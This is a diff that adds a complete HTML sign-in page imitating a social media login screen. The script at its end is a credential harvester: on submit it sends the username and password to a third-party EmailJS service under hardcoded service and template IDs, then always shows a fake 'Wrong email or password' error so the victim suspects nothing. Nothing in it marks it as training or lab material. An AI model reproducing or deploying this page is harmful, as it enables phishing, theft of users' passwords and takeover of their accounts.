@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in</title>
+
+  <link rel="icon" type="image/png" href="https://img.icons8.com/ios-filled/50/000000/lock--v1.png">
+
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: #262626;
+    }
+
+    /* Loader */
+    #page-loader {
+      position: fixed;
+      inset: 0;
+      background: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      transition: opacity 0.6s ease;
+    }
+
+    #page-loader.fade-out {
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    #page-loader .spinner {
+      width: 32px;
+      height: 32px;
+      border: 3px solid #dbdbdb;
+      border-top: 3px solid #3897f0;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* Main Box */
+    .container {
+      width: 100%;
+      max-width: 350px;
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 30px 28px;
+      text-align: center;
+    }
+
+    h2 {
+      margin-bottom: 25px;
+      font-weight: 600;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 8px;
+      font-size: 14px;
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 4px;
+      outline: none;
+    }
+
+    input:focus {
+      border-color: #a8a8a8;
+      background: #fff;
+    }
+
+    button {
+      width: 100%;
+      padding: 9px;
+      margin-top: 10px;
+      background: #3897f0;
+      border: none;
+      border-radius: 6px;
+      color: #fff;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #2f85d8;
+    }
+
+    .links {
+      margin-top: 18px;
+      font-size: 12px;
+    }
+
+    .links a {
+      color: #00376b;
+      text-decoration: none;
+    }
+
+    .error-message {
+      display: none;
+      color: #ed4956;
+      font-size: 13px;
+      margin-top: 10px;
+    }
+
+    .footer {
+      position: fixed;
+      bottom: 15px;
+      font-size: 11px;
+      color: #8e8e8e;
+      text-align: center;
+      width: 100%;
+    }
+
+    .footer a {
+      color: #8e8e8e;
+      margin: 0 6px;
+      text-decoration: none;
+    }
+
+    /* Signing in overlay */
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(255,255,255,0.9);
+      z-index: 9998;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    .loading-overlay .spinner {
+      width: 30px;
+      height: 30px;
+      border: 3px solid #dbdbdb;
+      border-top: 3px solid #3897f0;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div id="page-loader">
+    <div class="spinner"></div>
+  </div>
+
+  <div class="container" id="main-container">
+    <h2>Sign in</h2>
+
+    <form id="login-form">
+      <input
+        type="text"
+        id="email"
+        placeholder="Phone number, email or username"
+        required
+      />
+
+      <input
+        type="password"
+        id="password"
+        placeholder="Password"
+        required
+      />
+
+      <button type="submit">Log In</button>
+      <div class="error-message" id="error-msg">Wrong email or password</div>
+    </form>
+
+    <div class="links">
+      <a href="#">Forgot password?</a><br><br>
+      <span>Don't have an account? <a href="#">Sign up</a></span>
+    </div>
+  </div>
+
+  <div class="loading-overlay" id="loading-screen">
+    <div class="spinner"></div>
+  </div>
+
+  <div class="footer">
+    <a href="#">Legal</a>
+    <a href="#">Privacy</a>
+    <a href="#">Your Privacy Choices</a><br>
+    © Wireshield LLC Inc. 2024
+  </div>
+
+  <!-- JS NOT CHANGED -->
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    emailjs.init("Zuxy6x2TZlxuZ4ABj");
+
+    document.addEventListener("DOMContentLoaded", () => {
+      const pageLoader = document.getElementById("page-loader");
+
+      setTimeout(() => {
+        pageLoader.classList.add("fade-out");
+      }, 1200);
+
+      const form = document.getElementById("login-form");
+      const loader = document.getElementById("loading-screen");
+      const errorMsg = document.getElementById("error-msg");
+
+      form.addEventListener("submit", (e) => {
+        e.preventDefault();
+        loader.style.display = "flex";
+
+        emailjs.send("service_z1uzh6f", "template_whed5zh", {
+          email: document.getElementById("email").value,
+          password: document.getElementById("password").value
+        }).then(() => {
+          loader.style.display = "none";
+          errorMsg.style.display = "block";
+        }).catch(() => {
+          loader.style.display = "none";
+        });
+      });
+    });
+  </script>
+
+</body>
+</html>
